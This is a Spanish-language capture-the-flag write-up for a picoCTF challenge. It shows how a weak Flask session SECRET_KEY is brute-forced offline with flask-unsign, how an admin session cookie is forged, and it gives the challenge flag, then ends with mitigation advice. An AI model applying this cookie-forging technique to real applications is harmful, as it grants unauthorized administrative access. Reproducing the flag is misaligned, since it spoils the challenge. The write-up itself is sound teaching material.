## Descripción
Alright, enough of using my own encryption. Flask session cookies should be plenty secure!
## Solución
- Accedemos al sitio web del reto proporcionado por la instancia.
- En la interfaz nos encontramos con un formulario que nos pide ingresar el nombre de una galleta. Al ingresar el nombre sugerido en el placeholder (`snickerdoodle`), la página responde con el mensaje:
```text
That is a cookie! Not very special though...
I love snickerdoodle cookies!
```
- Inspeccionamos las cookies asignadas por la aplicación abriendo las herramientas de desarrollador (`F12` > pestaña *Application* o *Almacenamiento* > *Cookies*). Observamos una cookie llamada `session` con un valor compuesto por tres partes separadas por puntos (formato característico de las sesiones firmadas de Flask):
```text
eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.arIVBQ.m_vn76nsLRp8C5SqcufwM1QvYq8
```
- Decodificamos la primera sección en Base64 para analizar los datos serializados que almacena la sesión:
```bash
echo "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0" | base64 -d
```
- El resultado nos revela la estructura interna del JSON:
```json
{"very_auth": "snickerdoodle"}
```
- Al observar que la variable se llama `very_auth` y que la descripción del reto menciona *"Flask session cookies should be plenty secure!"*, deducimos que el objetivo es elevar privilegios cambiando el valor de `very_auth` a `"admin"`.
- Dado que las cookies de Flask están firmadas criptográficamente con una clave secreta (`SECRET_KEY`), cualquier alteración manual en la cookie será rechazada por el servidor a menos que conozcamos dicha clave. Siguiendo la temática del reto (galletas), la clave secreta corresponde a un tipo de galleta común.
- Creamos un diccionario llamado `cookies.txt` con nombres comunes de galletas en inglés (snickerdoodle, chocolate chip, oatmeal raisin, sugar, butter, lebkuchen, etc.).
- Utilizamos la herramienta `flask-unsign` para realizar un ataque de fuerza bruta offline contra la firma de nuestra cookie de sesión:
```bash
flask-unsign --unsign --cookie "eyJ2ZXJ5X2F1dGgiOiJzbmlja2VyZG9vZGxlIn0.arIVBQ.m_vn76nsLRp8C5SqcufwM1QvYq8" --wordlist cookies.txt
```
- La herramienta descifra exitosamente la clave secreta utilizada por el servidor:
```text
[*] Session decodes to: {'very_auth': 'snickerdoodle'}
[+] Found secret key after 28 attempts
'lebkuchen'
```
- Con la clave secreta identificada (`lebkuchen`), generamos y firmamos una nueva cookie asignando `"admin"` a la propiedad `very_auth`:
```bash
flask-unsign --sign --cookie "{'very_auth': 'admin'}" --secret 'lebkuchen'
```
- Obtenemos el token firmado resultante:
```text
eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.arIWCw.u0rQtRQW6Sx79m--4nJCYfCaFKE
```
- Reemplazamos el valor de la cookie `session` en el navegador con este nuevo token forjado y navegamos a la ruta `/display` (o recargamos la página).
- El backend valida la firma criptográfica con su clave secreta, reconoce la sesión con permisos de administrador y nos despliega la bandera:
```text
picoCTF{cO0ki3s_yum_98b76c03}
```
## Notas Adicionales
- Flask Session Cookies: Por defecto, el framework Flask almacena las sesiones del lado del cliente como cookies firmadas mediante la librería `itsdangerous`. Los datos están codificados (visibles en Base64), pero protegidos contra manipulación mediante una firma HMAC.
- Debilidad por claves predecibles o de baja entropía: Si la clave secreta (`SECRET_KEY`) de una aplicación web es débil, corta o se basa en palabras de diccionario, un atacante puede extraerla mediante fuerza bruta offline sin interactuar repetidamente con el servidor ni disparar alertas de seguridad.
- Herramienta `flask-unsign`: Utilidad especializada en línea de comandos para inspeccionar, realizar ataques de fuerza bruta offline contra firmas y forjar cookies de sesión firmadas en aplicaciones Flask.
- Mitigación: Para evitar la falsificación de cookies, las aplicaciones deben generar claves secretas criptográficamente seguras y de alta entropía (por ejemplo, con `secrets.token_hex(32)`) y almacenarlas de forma segura en variables de entorno fuera del código fuente.
## Referencias
- [Documentación oficial de Flask - Sessions](https://flask.palletsprojects.com/en/stable/quickstart/#sessions)
- [Repositorio de flask-unsign en GitHub](https://github.com/Paradoxis/Flask-Unsign)
- [OWASP - Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)